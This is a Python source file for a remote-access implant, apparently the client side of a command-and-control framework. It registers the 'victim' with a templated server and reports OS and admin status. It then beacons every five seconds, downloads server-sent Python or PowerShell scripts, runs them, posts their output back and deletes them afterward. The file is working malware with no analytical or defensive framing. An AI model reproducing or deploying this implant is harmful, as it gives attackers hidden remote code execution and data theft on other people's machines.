import os
import requests
import time
import random
import string
import base64
import platform
import pdb
import json
import subprocess
import sys
import traceback
from mss import mss
from os.path import isfile, join
import ctypes
import psutil

server_url = "##SERVER_URL##"

def staging(identifier):
	url = f"http://{server_url}:8080/stage_0"
	platform_name = platform.system()

	## Check if ran as admin or not
	if platform_name == 'Windows':
		admin = bool(ctypes.windll.shell32.IsUserAnAdmin())
	elif platform_name == 'Linux':
		admin = os.getuid() == 0

	cookies = {'session': base64.b64encode(identifier.encode("ascii")).decode("ascii")}
	os_info = {'platform': platform_name, 'version': platform.release(), 'admin':admin}
	r = requests.post(url = url,cookies = cookies, data = os_info)
	return r

## Send out beacons for 60secs at 5secs interval
def beacon(identifier):
	start_time = time.time()
	url = f"http://{server_url}:8080"

	while True:

		cookies = {'session': base64.b64encode(identifier.encode("ascii")).decode("ascii")}
		r = requests.get(url=url,cookies = cookies)

		## Server has commanded the victim to die
		if r.text == 'Die':
			exit()
		elif r.text != 'Nothing Fishy going on here :)':
			## Didin't get default reply, so some command has been sent?
			handle_commands(r,identifier)

		time.sleep(5)

## Handles commands sent by server as reponse
def handle_commands(response, identifier):
	try:
		## Recieved the commands in a dictionary text {'cmd': 'screenshot', 'script': 'script text'}. Converting to dictionary
		res = json.loads(response.text)

		language = res['language']

		## Save the script to file
		if platform.system() == 'Linux':
			dump_dir = '/tmp'
		else:
			dump_dir = os.getcwd()

		## Script save to file as per language, and filename is saved with taskid
		## so that it doesn't conflict with same filename stored in memory
		filename = res['command']+f"_{res['task_id']}"
		if language == 'python':
			save_path = join(dump_dir,f"{filename}.py")
		else:
			## Powershell
			save_path = join(dump_dir,f"{filename}.ps1")

		f = open(save_path, "w+")
		f.write(res['script'])
		f.close()

		## Execute the script file
		if os.path.isfile(save_path):

			if language == 'python':
				## The dump directory is to be added to os path as python looks there for requires in case not in current directory
				sys.path.append(os.path.abspath(dump_dir))
				file =  __import__(filename)

				command_output = file.execute_command()
			else:
				result = subprocess.run([r"powershell.exe", save_path], stdin=subprocess.PIPE , stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
				command_output = result.stdout.decode('utf-8')


		## TODO - Add command successful or not?
		## Send the command output back to server
		if command_output:
			url = f"http://{server_url}:8080/{res['command']}/output/{res['task_id']}"
			cookies = {'session': base64.b64encode(identifier.encode("ascii")).decode("ascii")}

			r = requests.post(url = url,cookies = cookies, data = command_output)
		else:
			## Some error happened while exexuting task, send some othe response code? TODO
			pass

		## Clean up the script we just created on the victim after execution
		if os.path.isfile(save_path):
			os.remove(save_path)
	except:
		## Some error happened while handling commands, sent the traceback to server back
		url = f"http://{server_url}:8080/clienterror"
		cookies = {'session': base64.b64encode(identifier.encode("ascii")).decode("ascii")}
		r = requests.post(url = url,cookies = cookies, data = traceback.format_exc())

def main():
	## Will identify the victim
	identifier = ''.join(random.choices(string.ascii_uppercase +string.digits, k = 10))
	response = staging(identifier)
	
	if response.status_code == 200:
		beacon(identifier)

if __name__=="__main__":
	try:
		main()
	except:
		## So that the stager process doesn't complain in case of any error
		pass